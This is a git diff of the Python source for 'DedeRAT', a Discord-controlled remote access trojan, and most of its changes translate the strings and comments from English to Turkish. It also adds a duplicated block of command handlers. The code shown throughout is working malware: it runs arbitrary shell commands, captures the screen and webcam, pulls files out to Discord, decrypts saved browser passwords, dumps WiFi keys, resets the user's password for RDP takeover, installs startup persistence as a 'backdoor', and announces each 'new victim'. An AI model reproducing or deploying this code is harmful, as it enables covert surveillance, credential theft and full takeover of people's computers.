@@ -86,12 +86,12 @@ def get_system_info():
 
 @bot.event
 async def on_ready():
-    print(f'Logged in as {bot.user.name}')
+    print(f'{bot.user.name} olarak giriş yapıldı')
     channel = bot.get_channel(serverid)
     if channel:
-        await channel.send(f':octagonal_sign: New Victim Connected | Session ID : {sessionid} | IP : {ip_address} | Hostname : {hostname}')
+        await channel.send(f':octagonal_sign: Yeni Kurban Bağlandı | Oturum ID: {sessionid} | IP: {ip_address} | Bilgisayar Adı: {hostname}')
     else:
-        print("Channel not found")
+        print("Kanal bulunamadı")
 
 @bot.command(name='sysinfo')
 async def sysinfo(ctx):
@@ -103,7 +103,7 @@ async def sysinfo(ctx):
         info = get_system_info()
         await ctx.send(info)
     else:
-        await ctx.send(f"Invalid format.")
+        await ctx.send(f"Geçersiz format.")
 
 @bot.command(name='ss')
 async def ss(ctx):
@@ -116,7 +116,7 @@ async def ss(ctx):
         await ctx.send(file=discord.File(screenshot_path))
         os.remove(screenshot_path)
     else:
-        await ctx.send(f"Invalid format.")
+        await ctx.send(f"Geçersiz format.")
 
 @bot.command(name='shell')
 async def shell(ctx, *, command=None):
@@ -124,13 +124,13 @@ async def shell(ctx, *, command=None):
     parts = message_content.split(f' si:{sessionid}')
     if len(parts) == 2 and parts[1].strip() == '':
         if command is None:
-            await ctx.send("Shell command cannot be empty!")
+            await ctx.send("Shell komutu boş olamaz!")
         else:
             try:
                 process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 stdout, stderr = process.communicate()
                 
-                # Decode output with 'utf-8' and fall back to 'cp1252' if needed
+                # 'utf-8' ile çıktı dekode et ve gerekiyorsa 'cp1252' ile yedeğe al
                 try:
                     stdout = stdout.decode('utf-8')
                     stderr = stderr.decode('utf-8')
@@ -138,7 +138,7 @@ async def shell(ctx, *, command=None):
                     stdout = stdout.decode('cp1252', errors='replace')
                     stderr = stderr.decode('cp1252', errors='replace')
 
-                # Write to file with 'utf-8' encoding
+                # 'utf-8' kodlamasıyla dosyaya yaz
                 stouter_path = os.path.join(roaming_path, 'stout.txt')
                 with open(stouter_path, 'w', encoding='utf-8') as stouter:
                     stouter.write(stdout)
@@ -146,9 +146,9 @@ async def shell(ctx, *, command=None):
                 await ctx.send(file=discord.File(stouter_path))
                 os.remove(stouter_path)
             except Exception as e:
-                await ctx.send(f"An error occurred: {e}")
+                await ctx.send(f"Bir hata oluştu: {e}")
     else:
-        await ctx.send("Invalid session ID or command format.")
+        await ctx.send("Geçersiz oturum ID'si veya komut formatı.")
 
 @bot.command(name='cd')
 async def cd(ctx, *, path=None):
@@ -157,46 +157,46 @@ async def cd(ctx, *, path=None):
     if len(parts) == 2 and parts[1].strip() == '':
         path = parts[0].replace(f'{ctx.prefix}cd ', '').strip()
         if path == '':
-            await ctx.send("Path cannot be empty!")
+            await ctx.send("Yol boş olamaz!")
         else:
             try:
                 os.chdir(path)
-                await ctx.send(f"Changed directory to {path}")
+                await ctx.send(f"Yol {path} olarak değiştirildi")
             except FileNotFoundError:
-                await ctx.send(f"Directory not found: {path}")
+                await ctx.send(f"Direktör bulunamadı: {path}")
             except Exception as e:
-                await ctx.send(f"An error occurred: {e}")
+                await ctx.send(f"Bir hata oluştu: {e}")
     else:
-        await ctx.send("Invalid session ID or command format.")
+        await ctx.send("Geçersiz oturum ID'si veya komut formatı.")
 
 @bot.command()
 async def ls(ctx):
-    directory = '.'  # You can specify any directory here
+    directory = '.'  # Buraya herhangi bir dizin belirtebilirsiniz
 
     message_content = ctx.message.content
     parts = message_content.split(f' si:{sessionid}')
     if len(parts) == 2:
         try:
-            # Get all files and directories in the specified directory
+            # Belirtilen dizindeki tüm dosyaları ve dizinleri al
             files_and_dirs = os.listdir(directory)
             
-            # Prepare lists for files and directories
+            # Dosyalar ve dizinler için listeler hazırlayın
             files = [f for f in files_and_dirs if os.path.isfile(os.path.join(directory, f))]
             dirs = [d for d in files_and_dirs if os.path.isdir(os.path.join(directory, d))]
             
-            # Combine files and directories into one list
+            # Dosyalar ve dizinleri tek bir listeye birleştirin
             all_items = files + dirs
             
             if all_items:
-                item_list = '\n'.join(all_items)  # Join the list into a single string
-                await ctx.send(f"Files and directories in the directory:\n{item_list}")
+                item_list = '\n'.join(all_items)  # Listeyi tek bir string olarak birleştirin
+                await ctx.send(f"Dizindeki dosyalar ve dizinler:\n{item_list}")
             else:
-                await ctx.send("No files or directories found in the directory.")
+                await ctx.send("Dizinde dosya veya dizin bulunamadı.")
                 
         except Exception as e:
-            await ctx.send(f"An error occurred: {str(e)}")
+            await ctx.send(f"Bir hata oluştu: {str(e)}")
     else:
-        await ctx.send("Invalid session ID or command format.")
+        await ctx.send("Geçersiz oturum ID'si veya komut formatı.")
 
 @bot.command(name='stealrdp')
 async def stealrdp(ctx):
@@ -208,9 +208,9 @@ async def stealrdp(ctx):
         rdppassrandint = random.randint(1000000, 9999999)
         rdppassw = f"{rdppassrandint}!!"
         os.system(f'net user %username% {passw}')
-        await ctx.send(f'\nUsername : {hostname}\nIP Address : {ip}\nPassword : {passw}')
+        await ctx.send(f'\nKullanıcı Adı : {hostname}\nIP Adresi : {ip}\nŞifre : {passw}')
     else:
-        await ctx.send("Invalid session ID or command format.")
+        await ctx.send("Geçersiz oturum ID'si veya komut formatı.")
 
 @bot.command(name='record')
 async def record(ctx, seconds: int):
@@ -218,10 +218,10 @@ async def record(ctx, seconds: int):
     parts = message_content.split(f' si:{sessionid}')
     if len(parts) == 2 and parts[1].strip() == '':
         if seconds <= 0:
-            await ctx.send("The duration must be a positive integer.")
+            await ctx.send("Süre pozitif bir tam sayı olmalıdır.")
             return
 
-        await ctx.send(f"Recording for {seconds} seconds...")
+        await ctx.send(f"{seconds} saniye boyunca kayıt yapılıyor...")
 
         fourcc = cv2.VideoWriter_fourcc(*'XVID')
         out = cv2.VideoWriter("output.avi", fourcc, 5.0, (1366, 768))
@@ -242,21 +242,20 @@ async def record(ctx, seconds: int):
 
         os.remove("output.avi")
     else:
-        await ctx.send("Invalid session ID or command format.")
+        await ctx.send("Geçersiz oturum ID'si veya komut formatı.")
 
 @bot.command()
 async def download(ctx, *, path=None):
     message_content = ctx.message.content
     parts = message_content.split(f' si:{sessionid}')
     if len(parts) == 2 and parts[1].strip() == '':
-        if path==None:
-            await ctx.send("Path cannot be empty!")
+        if path == None:
+            await ctx.send("Yol boş olamaz!")
         else:
-            await ctx.send(f"File at {path} sending...")
+            await ctx.send(f"{path} yolundaki dosya gönderiliyor...")
             await ctx.send(file=discord.File(path))
     else:
-        await ctx.send("Invalid session ID or command format.")
-
+        await ctx.send("Geçersiz oturum ID'si veya komut formatı.")
 
 @bot.command()
 async def upload(ctx, *, path=None):
@@ -264,11 +263,11 @@ async def upload(ctx, *, path=None):
     parts = message_content.split(f' si:{sessionid}')
     if len(parts) == 2 and parts[1].strip() == '':
         if path is None:
-            await ctx.send("Path cannot be empty!")
+            await ctx.send("Yol boş olamaz!")
             return
         
         if len(ctx.message.attachments) == 0:
-            await ctx.send("Please upload a file.")
+            await ctx.send("Lütfen bir dosya yükleyin.")
             return
         
         attachment = ctx.message.attachments[0]
@@ -281,9 +280,9 @@ async def upload(ctx, *, path=None):
         save_path = os.path.join(directory, attachment.filename)
         
         await attachment.save(save_path)
-        await ctx.send(f"File uploaded to {save_path} successfully!")
+        await ctx.send(f"{save_path} yoluna dosya başarıyla yüklendi!")
     else:
-        await ctx.send("Invalid session ID or command format.")
+        await ctx.send("Geçersiz oturum ID'si veya komut formatı.")
 
 def set_wallpaper(image_path):
     ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
@@ -294,7 +293,7 @@ async def setbg(ctx):
     parts = message_content.split(f' si:{sessionid}')
     if len(parts) == 2 and parts[1].strip() == '':
         if len(ctx.message.attachments) == 0:
-            await ctx.send("Please attach an image file.")
+            await ctx.send("Lütfen bir resim dosyası ekleyin.")
             return
 
         attachment = ctx.message.attachments[0]
@@ -310,18 +309,252 @@ async def setbg(ctx):
             img = Image.open(temp_image_path)
             img.verify()  # Dosyanın geçerli bir resim olup olmadığını kontrol et
         except (IOError, SyntaxError) as e:
-            await ctx.send("Invalid image file.")
+            await ctx.send(f"Geçersiz resim dosyası: {e}")
             os.remove(temp_image_path)
             return
 
-        # Masaüstü arka planını değiştir
+        # Duvar kağıdını ayarla
         set_wallpaper(temp_image_path)
-        await ctx.send(f"Wallpaper changed to {temp_image_path}.")
-
-        # Geçici dosyayı temizle
+        await ctx.send(f"Arka plan resmi başarıyla ayarlandı!")
         os.remove(temp_image_path)
     else:
-        await ctx.send("Invalid session ID or command format.")
+        await ctx.send("Geçersiz oturum ID'si veya komut formatı.")
+
+@bot.event
+async def on_ready():
+    print(f'{bot.user.name} olarak giriş yapıldı')
+    channel = bot.get_channel(serverid)
+    if channel:
+        await channel.send(f':octagonal_sign: Yeni Kurban Bağlandı | Oturum ID: {sessionid} | IP: {ip_address} | Bilgisayar Adı: {hostname}')
+    else:
+        print("Kanal bulunamadı")
+
+@bot.command(name='sysinfo')
+async def sysinfo(ctx):
+    message_content = ctx.message.content
+    parts = message_content.split(f' si:{sessionid}')
+    if len(parts) == 2:
+        msg = parts[0]
+        generated_sessionid = parts[1].strip()
+        info = get_system_info()
+        await ctx.send(info)
+    else:
+        await ctx.send(f"Geçersiz format.")
+
+@bot.command(name='ss')
+async def ss(ctx):
+    message_content = ctx.message.content
+    parts = message_content.split(f' si:{sessionid}')
+    if len(parts) == 2:
+        screenshot = pyautogui.screenshot()
+        screenshot_path = "screenshot.png"
+        screenshot.save(screenshot_path)
+        await ctx.send(file=discord.File(screenshot_path))
+        os.remove(screenshot_path)
+    else:
+        await ctx.send(f"Geçersiz format.")
+
+@bot.command(name='shell')
+async def shell(ctx, *, command=None):
+    message_content = ctx.message.content
+    parts = message_content.split(f' si:{sessionid}')
+    if len(parts) == 2 and parts[1].strip() == '':
+        if command is None:
+            await ctx.send("Shell komutu boş olamaz!")
+        else:
+            try:
+                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                stdout, stderr = process.communicate()
+                
+                # 'utf-8' ile çıktı dekode et ve gerekiyorsa 'cp1252' ile yedeğe al
+                try:
+                    stdout = stdout.decode('utf-8')
+                    stderr = stderr.decode('utf-8')
+                except UnicodeDecodeError:
+                    stdout = stdout.decode('cp1252', errors='replace')
+                    stderr = stderr.decode('cp1252', errors='replace')
+
+                # 'utf-8' kodlamasıyla dosyaya yaz
+                stouter_path = os.path.join(roaming_path, 'stout.txt')
+                with open(stouter_path, 'w', encoding='utf-8') as stouter:
+                    stouter.write(stdout)
+                
+                await ctx.send(file=discord.File(stouter_path))
+                os.remove(stouter_path)
+            except Exception as e:
+                await ctx.send(f"Bir hata oluştu: {e}")
+    else:
+        await ctx.send("Geçersiz oturum ID'si veya komut formatı.")
+
+@bot.command(name='cd')
+async def cd(ctx, *, path=None):
+    message_content = ctx.message.content
+    parts = message_content.rsplit(f' si:{sessionid}', 1)
+    if len(parts) == 2 and parts[1].strip() == '':
+        path = parts[0].replace(f'{ctx.prefix}cd ', '').strip()
+        if path == '':
+            await ctx.send("Yol boş olamaz!")
+        else:
+            try:
+                os.chdir(path)
+                await ctx.send(f"Yol {path} olarak değiştirildi")
+            except FileNotFoundError:
+                await ctx.send(f"Direktör bulunamadı: {path}")
+            except Exception as e:
+                await ctx.send(f"Bir hata oluştu: {e}")
+    else:
+        await ctx.send("Geçersiz oturum ID'si veya komut formatı.")
+
+@bot.command()
+async def ls(ctx):
+    directory = '.'  # Buraya herhangi bir dizin belirtebilirsiniz
+
+    message_content = ctx.message.content
+    parts = message_content.split(f' si:{sessionid}')
+    if len(parts) == 2:
+        try:
+            # Belirtilen dizindeki tüm dosyaları ve dizinleri al
+            files_and_dirs = os.listdir(directory)
+            
+            # Dosyalar ve dizinler için listeler hazırlayın
+            files = [f for f in files_and_dirs if os.path.isfile(os.path.join(directory, f))]
+            dirs = [d for d in files_and_dirs if os.path.isdir(os.path.join(directory, d))]
+            
+            # Dosyalar ve dizinleri tek bir listeye birleştirin
+            all_items = files + dirs
+            
+            if all_items:
+                item_list = '\n'.join(all_items)  # Listeyi tek bir string olarak birleştirin
+                await ctx.send(f"Dizindeki dosyalar ve dizinler:\n{item_list}")
+            else:
+                await ctx.send("Dizinde dosya veya dizin bulunamadı.")
+                
+        except Exception as e:
+            await ctx.send(f"Bir hata oluştu: {str(e)}")
+    else:
+        await ctx.send("Geçersiz oturum ID'si veya komut formatı.")
+
+@bot.command(name='stealrdp')
+async def stealrdp(ctx):
+    message_content = ctx.message.content
+    parts = message_content.split(f' si:{sessionid}')
+    if len(parts) == 2:
+        hostname = socket.gethostname()
+        rdpip = requests.get('https://api.ipify.org').text
+        rdppassrandint = random.randint(1000000, 9999999)
+        rdppassw = f"{rdppassrandint}!!"
+        os.system(f'net user %username% {passw}')
+        await ctx.send(f'\nKullanıcı Adı : {hostname}\nIP Adresi : {ip}\nŞifre : {passw}')
+    else:
+        await ctx.send("Geçersiz oturum ID'si veya komut formatı.")
+
+@bot.command(name='record')
+async def record(ctx, seconds: int):
+    message_content = ctx.message.content
+    parts = message_content.split(f' si:{sessionid}')
+    if len(parts) == 2 and parts[1].strip() == '':
+        if seconds <= 0:
+            await ctx.send("Süre pozitif bir tam sayı olmalıdır.")
+            return
+
+        await ctx.send(f"{seconds} saniye boyunca kayıt yapılıyor...")
+
+        fourcc = cv2.VideoWriter_fourcc(*'XVID')
+        out = cv2.VideoWriter("output.avi", fourcc, 5.0, (1366, 768))
+
+        start_time = time.time()
+        while time.time() - start_time < seconds:
+            img = ImageGrab.grab()
+            img_np = np.array(img)
+            frame = cv2.cvtColor(img_np, cv2.COLOR_RGB2BGR)
+            out.write(frame)
+
+        out.release()
+        cv2.destroyAllWindows()
+
+        time.sleep(1)
+
+        await ctx.send(file=discord.File("output.avi"))
+
+        os.remove("output.avi")
+    else:
+        await ctx.send("Geçersiz oturum ID'si veya komut formatı.")
+
+@bot.command()
+async def download(ctx, *, path=None):
+    message_content = ctx.message.content
+    parts = message_content.split(f' si:{sessionid}')
+    if len(parts) == 2 and parts[1].strip() == '':
+        if path == None:
+            await ctx.send("Yol boş olamaz!")
+        else:
+            await ctx.send(f"{path} yolundaki dosya gönderiliyor...")
+            await ctx.send(file=discord.File(path))
+    else:
+        await ctx.send("Geçersiz oturum ID'si veya komut formatı.")
+
+@bot.command()
+async def upload(ctx, *, path=None):
+    message_content = ctx.message.content
+    parts = message_content.split(f' si:{sessionid}')
+    if len(parts) == 2 and parts[1].strip() == '':
+        if path is None:
+            await ctx.send("Yol boş olamaz!")
+            return
+        
+        if len(ctx.message.attachments) == 0:
+            await ctx.send("Lütfen bir dosya yükleyin.")
+            return
+        
+        attachment = ctx.message.attachments[0]
+        
+        directory = os.path.dirname(path)
+        
+        if not os.path.exists(directory):
+            os.makedirs(directory)
+        
+        save_path = os.path.join(directory, attachment.filename)
+        
+        await attachment.save(save_path)
+        await ctx.send(f"{save_path} yoluna dosya başarıyla yüklendi!")
+    else:
+        await ctx.send("Geçersiz oturum ID'si veya komut formatı.")
+
+def set_wallpaper(image_path):
+    ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
+
+@bot.command()
+async def setbg(ctx):
+    message_content = ctx.message.content
+    parts = message_content.split(f' si:{sessionid}')
+    if len(parts) == 2 and parts[1].strip() == '':
+        if len(ctx.message.attachments) == 0:
+            await ctx.send("Lütfen bir resim dosyası ekleyin.")
+            return
+
+        attachment = ctx.message.attachments[0]
+        
+        # Geçici dosya yolu
+        temp_image_path = os.path.join(os.getcwd(), 'temp_image.jpg')
+
+        # Dosyayı indirin ve kaydedin
+        await attachment.save(temp_image_path)
+
+        # Resmi doğrula
+        try:
+            img = Image.open(temp_image_path)
+            img.verify()  # Dosyanın geçerli bir resim olup olmadığını kontrol et
+        except (IOError, SyntaxError) as e:
+            await ctx.send(f"Geçersiz resim dosyası: {e}")
+            os.remove(temp_image_path)
+            return
+
+        # Duvar kağıdını ayarla
+        set_wallpaper(temp_image_path)
+        await ctx.send(f"Arka plan resmi başarıyla ayarlandı!")
+        os.remove(temp_image_path)
+    else:
+        await ctx.send("Geçersiz oturum ID'si veya komut formatı.")
 
 @bot.command()
 async def msgbox(ctx, *, args: str):
@@ -580,7 +813,6 @@ data_queries = {
     }
 }
 
-# Decrypts stored passwords
 def decrypt_password(buff: bytes, key: bytes) -> str:
     iv = buff[3:15]
     payload = buff[15:]
@@ -589,7 +821,7 @@ def decrypt_password(buff: bytes, key: bytes) -> str:
     decrypted_pass = decrypted_pass[:-16].decode()
     return decrypted_pass
 
-# Get master key for decryption
+# Deşifre için anahtarı alır
 def get_master_key(path: str):
     if not os.path.exists(path):
         return None
@@ -605,18 +837,18 @@ def get_master_key(path: str):
     key = CryptUnprotectData(key, None, None, None, 0)[1]
     return key
 
-# Save results to file
+# Sonuçları dosyaya kaydeder
 def save_results(browser_name, type_of_data, content):
     if not os.path.exists(browser_name):
         os.mkdir(browser_name)
     if content:
         with open(f'{browser_name}/{type_of_data}.txt', 'w', encoding="utf-8") as file:
             file.write(content)
-        print(f"\t [*] Saved in {browser_name}/{type_of_data}.txt")
+        print(f"\t [*] {browser_name}/{type_of_data}.txt dosyasına kaydedildi")
     else:
-        print(f"\t [-] No Data Found!")
+        print(f"\t [-] Veri Bulunamadı!")
 
-# Get data from database
+# Verileri veritabanından alır
 def get_data(path: str, profile: str, key, type_of_data):
     db_file = f'{path}\\{profile}{type_of_data["file"]}'
     if not os.path.exists(db_file):
@@ -625,7 +857,7 @@ def get_data(path: str, profile: str, key, type_of_data):
     try:
         shutil.copy(db_file, 'temp_db')
     except:
-        print(f"Can't access file {type_of_data['file']}")
+        print(f"{type_of_data['file']} dosyasına erişilemiyor")
         return result
     conn = sqlite3.connect('temp_db')
     cursor = conn.cursor()
@@ -646,16 +878,16 @@ def get_data(path: str, profile: str, key, type_of_data):
     os.remove('temp_db')
     return result
 
-# Convert Chrome time format
+# Chrome zaman formatını dönüştürür
 def convert_chrome_time(chrome_time):
     try:
-        chrome_time = int(chrome_time)  # Ensure it's an integer
+        chrome_time = int(chrome_time)  # Bir tamsayı olduğundan emin ol
         return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')
     except ValueError:
-        return "Invalid date"
+        return "Geçersiz tarih"
 
 
-# Check for installed browsers
+# Yüklü tarayıcıları kontrol eder
 def installed_browsers():
     available = []
     for x in browsers.keys():
@@ -670,7 +902,7 @@ async def grab(ctx):
     if len(parts) == 2 and parts[1].strip() == '':
         available_browsers = installed_browsers()
         if not available_browsers:
-            await ctx.send("No browsers found.")
+            await ctx.send("Tarayıcı bulunamadı.")
             return
         
         results = ""
@@ -678,7 +910,7 @@ async def grab(ctx):
             browser_path = browsers[browser]
             master_key = get_master_key(browser_path)
             if not master_key:
-                await ctx.send(f"Could not retrieve master key for {browser}.")
+                await ctx.send(f"{browser} için anahtar alınamadı.")
                 continue
             
             for data_type_name, data_type in data_queries.items():
@@ -691,21 +923,21 @@ async def grab(ctx):
                     results += f"**{browser} - {data_type_name.replace('_', ' ').capitalize()}**:\n{data}\n\n"
         
         if results:
-            # Save results to a text file
+            # Sonuçları bir dosyaya kaydet
             file_path = 'results.txt'
             with open(file_path, 'w', encoding='utf-8') as file:
                 file.write(results)
             
-            # Send the file to Discord
+            # Dosyayı Discord'a gönder
             with open(file_path, 'rb') as file:
                 await ctx.send(file=discord.File(file, filename='results.txt'))
             
-            # Remove the file after sending
+            # Dosyayı gönderdikten sonra sil
             os.remove(file_path)
         else:
-            await ctx.send("No data found.")
+            await ctx.send("Veri bulunamadı.")
     else:
-        await ctx.send("Invalid session ID or command format.")
+        await ctx.send("Geçersiz oturum ID'si veya komut formatı.")
 
 @bot.command(name='cameraphoto')
 async def cameraphoto(ctx, path=None):
@@ -714,19 +946,19 @@ async def cameraphoto(ctx, path=None):
     if len(parts) == 2 and parts[1].strip() == '':
         width, height = 640, 380
 
-        cap = cv2.VideoCapture(0)  # 0 corresponds to the default camera (usually the built-in webcam)
+        cap = cv2.VideoCapture(0)  # 0 varsayılan kamerayı (genellikle dahili webcam) ifade eder
 
         if not cap.isOpened():
-            await ctx.send("Error: Could not open camera.")
+            await ctx.send("Hata: Kamera açılamadı.")
             return
 
-        cap.set(3, width)  # Width
-        cap.set(4, height)  # Height
+        cap.set(3, width)  # Genişlik
+        cap.set(4, height)  # Yükseklik
 
         ret, frame = cap.read()
 
         if not ret:
-            await ctx.send("Error: Could not capture a photo.")
+            await ctx.send("Hata: Fotoğraf çekilemedi.")
             cap.release()
             return
 
@@ -734,18 +966,18 @@ async def cameraphoto(ctx, path=None):
         cv2.imwrite(photo_filename, frame)
         cap.release()
 
-        # Sending the photo to the Discord channel
+        # Fotoğrafı Discord kanalına gönder
         try:
             with open(photo_filename, 'rb') as f:
                 picture = discord.File(f)
                 await ctx.send(file=picture)
         except Exception as e:
-            await ctx.send(f"Error: {e}")
+            await ctx.send(f"Hata: {e}")
         finally:
             if os.path.exists(photo_filename):
                 os.remove(photo_filename)
     else:
-        await ctx.send("Invalid session ID or command format.")
+        await ctx.send("Geçersiz oturum ID'si veya komut formatı.")
     username=os.getlogin()
     docs=fr"C:\Users\{username}\Documents"
     
@@ -798,17 +1030,16 @@ def copy_to_startup():
     else:
         print(f"Dosya {script_path} bulunamadı.")
 
+
 @bot.command(name='backdoor')
 async def backdoor(ctx):
     message_content = ctx.message.content
     parts = message_content.split(f' si:{sessionid}')
     if len(parts) == 2 and parts[1].strip() == '':
         copy_to_startup()
-        await ctx.send("Backdoored!")
+        await ctx.send("Arka kapı kuruldu!")
     else:
-        await ctx.send("Invalid session ID or command format.")
-
-
+        await ctx.send("Geçersiz oturum ID'si veya komut formatı.")
 
 @bot.command(name='recordvideo')
 async def recordvideo(ctx, seconds: float):
@@ -816,23 +1047,23 @@ async def recordvideo(ctx, seconds: float):
     parts = message_content.split(f' si:{sessionid}')
     if len(parts) == 2 and parts[1].strip() == '':
         width, height = 640, 380
-        fps = 30  # Frames per second
+        fps = 30  # Kare hızı
 
-        cap = cv2.VideoCapture(0)  # 0 corresponds to the default camera (usually the built-in webcam)
+        cap = cv2.VideoCapture(0)  # 0 varsayılan kamerayı (genellikle dahili webcam) ifade eder
 
         if not cap.isOpened():
-            await ctx.send("Error: Could not open camera.")
+            await ctx.send("Hata: Kamera açılamadı.")
             return
 
         cap.set(cv2.CAP_PROP_FRAME_WIDTH, width)
         cap.set(cv2.CAP_PROP_FRAME_HEIGHT, height)
         cap.set(cv2.CAP_PROP_FPS, fps)
 
-        # Use a temporary file for the video with .avi extension
+        # Geçici bir dosya kullanarak videoyu kaydet
         with tempfile.NamedTemporaryFile(suffix=".avi", delete=False) as temp_video_file:
             video_filename = temp_video_file.name
 
-        fourcc = cv2.VideoWriter_fourcc(*'XVID')  # Codec for .avi files
+        fourcc = cv2.VideoWriter_fourcc(*'XVID')  # .avi dosyaları için codec
         out = cv2.VideoWriter(video_filename, fourcc, fps, (width, height))
 
         end_time = cv2.getTickCount() + (seconds * cv2.getTickFrequency())
@@ -840,30 +1071,30 @@ async def recordvideo(ctx, seconds: float):
         while cv2.getTickCount() < end_time:
             ret, frame = cap.read()
             if not ret:
-                await ctx.send("Error: Could not read frame from camera.")
+                await ctx.send("Hata: Kameradan kare okunamadı.")
                 cap.release()
                 out.release()
                 os.remove(video_filename)
                 return
 
             out.write(frame)
-            await asyncio.sleep(0.01)  # Sleep briefly to avoid blocking other bot activities
+            await asyncio.sleep(0.01)  # Diğer bot işlemlerini engellememek için kısa bir süre uyuma
 
         cap.release()
         out.release()
 
-        # Sending the video to the Discord channel
+        # Videoyu Discord kanalına gönderme
         try:
             with open(video_filename, 'rb') as f:
                 video = discord.File(f)
                 await ctx.send(file=video)
         except Exception as e:
-            await ctx.send(f"Error: {e}")
+            await ctx.send(f"Hata: {e}")
         finally:
             if os.path.exists(video_filename):
                 os.remove(video_filename)
     else:
-        await ctx.send("Invalid session ID or command format.")
+        await ctx.send("Geçersiz oturum ID'si veya komut formatı.")
 
 @bot.command()
 async def execute(ctx, path=None):
@@ -871,14 +1102,14 @@ async def execute(ctx, path=None):
     parts = message_content.split(f' si:{sessionid}')
     if len(parts) == 2 and parts[1].strip() == '':
         if path is None:
-            await ctx.send("Please enter a path")
+            await ctx.send("Lütfen bir yol girin")
         else:
             os.system(path)
-            await ctx.send(path + " executed successfuly!")
+            await ctx.send(f"{path} başarıyla çalıştırıldı!")
     else:
-        await ctx.send("Invalid session ID or command format.")
+        await ctx.send("Geçersiz oturum ID'si veya komut formatı.")
 
-system_information = "Informations.txt"
+system_information = "Bilgiler.txt"
 file_path = os.getcwd()
 
 @bot.command()
@@ -891,7 +1122,7 @@ async def wifipasswords(ctx):
             output = subprocess.check_output("netsh wlan show profile", shell=True).decode()
             
             with open(file_path + "\\" + system_information, "w") as f:
-                f.write("All of Registered Connections\n")
+                f.write("Tüm Kayıtlı Bağlantılar\n")
                 f.write("==================================\n")
             
             # Profilleri yazma
@@ -910,15 +1141,15 @@ async def wifipasswords(ctx):
                     
                     # Profil bilgilerini dosyaya yazma
                     with open(file_path + "\\" + system_information, "a") as f:
-                        f.write(f"Profile: {profile_name}\n")
+                        f.write(f"Profil: {profile_name}\n")
                         if key_content:
-                            f.write(f"Password: {key_content}\n")
+                            f.write(f"Şifre: {key_content}\n")
                         else:
-                            f.write("Password: Not found\n")
+                            f.write("Şifre: Bulunamadı\n")
                         f.write("\n")
                         
         except subprocess.CalledProcessError as e:
-            await ctx.send(f"Error while fetching WiFi passwords: {e}")
+            await ctx.send(f"WiFi şifrelerini alırken hata oluştu: {e}")
             return
         
         # Dosyayı Discord'a gönderme
@@ -927,38 +1158,37 @@ async def wifipasswords(ctx):
         # Dosyayı temizleme
         os.remove(file_path + "\\" + system_information)
     else:
-        await ctx.send("Invalid session ID or command format.")
-
+        await ctx.send("Geçersiz oturum ID'si veya komut formatı.")
 
 @bot.command()
 async def helpme(ctx):
-    helpembed = discord.Embed(title="DedeRAT Commands", color=discord.Colour.red())
+    helpembed = discord.Embed(title="DedeRAT Komutları", color=discord.Colour.red())
     helpembed.set_thumbnail(url="https://i.hizliresim.com/7co62f9.jpg")
-    helpembed.add_field(name="cd", value=r"You can change directory! Usage : cd C:\\full\path\of\directory", inline=True)
-    helpembed.add_field(name="pwd", value=r"See which directory in you are.", inline=False)
-    helpembed.add_field(name="delet", value=r"Remove a file.", inline=False)
-    helpembed.add_field(name="download", value=r"Did you like any file in victims computer? Let's get it! Usage : download C:\\full\path\of\directory", inline=False)
-    helpembed.add_field(name="msgbox", value="Lets troll a little bit victim :> Usage : msgbox -msg Message -ttl Title", inline=False)
-    helpembed.add_field(name="record", value="You can watch for a time! Usage : record 10 (i mean seconds as 10)", inline=False)
-    helpembed.add_field(name="setbg", value="Just upload a photo and surprise the victim", inline=False)
-    helpembed.add_field(name="shell", value="Execute CMD commands! Usage : shell dir", inline=False)
+    helpembed.add_field(name="cd", value=r"Bir dizini değiştirebilirsiniz! Kullanım : cd C:\\tam\\yol\\dizine", inline=True)
+    helpembed.add_field(name="pwd", value=r"Şu anda hangi dizinde olduğunuzu görün.", inline=False)
+    helpembed.add_field(name="delet", value=r"Bir dosyayı silin.", inline=False)
+    helpembed.add_field(name="download", value=r"Kurbanın bilgisayarındaki herhangi bir dosyayı indirin! Kullanım : download C:\\tam\\yol\\dizine", inline=False)
+    helpembed.add_field(name="msgbox", value="Kurbanı biraz eğlendir:> Kullanım : msgbox -msg Mesaj -ttl Başlık", inline=False)
+    helpembed.add_field(name="record", value="Bir süreliğine kayıt yapabilirsiniz! Kullanım : record 10 (saniye olarak 10 anlamında)", inline=False)
+    helpembed.add_field(name="setbg", value="Bir fotoğraf yükleyin ve kurbanı sürprizle karşılayın", inline=False)
+    helpembed.add_field(name="shell", value="CMD komutlarını çalıştırın! Kullanım : shell dir", inline=False)
     helpembed.add_field(name="ss", value="Selfie!", inline=False)
-    helpembed.add_field(name="stealrdp", value="Somebody opened your virus in RDP? Lets get a revenge!", inline=False)
-    helpembed.add_field(name="sysinfo", value="Wanna read something long? Lets read system info.", inline=False)
-    helpembed.add_field(name="upload", value=r"Give a gift to victim! Usage : upload C:\\full\path\of\your\wish (and attach a file)", inline=False)
-    helpembed.add_field(name="capsrandtroll", value="iTs sEeMs lİkE tHaT! Usage : capsrandtroll 10 (seconds i mean)", inline=False)
-    helpembed.add_field(name="visitsite", value="Travel!", inline=False)
-    helpembed.add_field(name="shutdown", value="Maybe your victim trying downloading GTA V and it was %99 haha :>")
-    helpembed.add_field(name="tasklist", value="Lets see which programs is open in your victim's PC", inline=False)
-    helpembed.add_field(name="taskkill", value="You can close a program or game in your victim's PC :>", inline=False)
-    helpembed.add_field(name="write", value="Write a sentence in your victim's PC", inline=False)
-    helpembed.add_field(name="moveto", value="Move victim's mouse! Usage : moveto 100, 300 (moveto x y)", inline=False)
-    helpembed.add_field(name="webcamlist", value="See the list of webcam", inline=False)
-    helpembed.add_field(name="cameraphoto", value="Selfie again!", inline=False)
-    helpembed.add_field(name="execute", value="Execute a file! Usage : execute <path>", inline=False)
-    helpembed.add_field(name="recordvideo", value="Watch much your wish! Usage : recordvideo 10.0 (yeah i forgot it as float)", inline=False)
-    helpembed.add_field(name="wifipasswords", value="See the wifis and passwords of victim connected once!", inline=False)
-    helpembed.add_field(name="grab", value="Grab victim's passwords!", inline=False)
+    helpembed.add_field(name="stealrdp", value="Birisi virüsü RDP'de açtı mı? İntikam alalım!", inline=False)
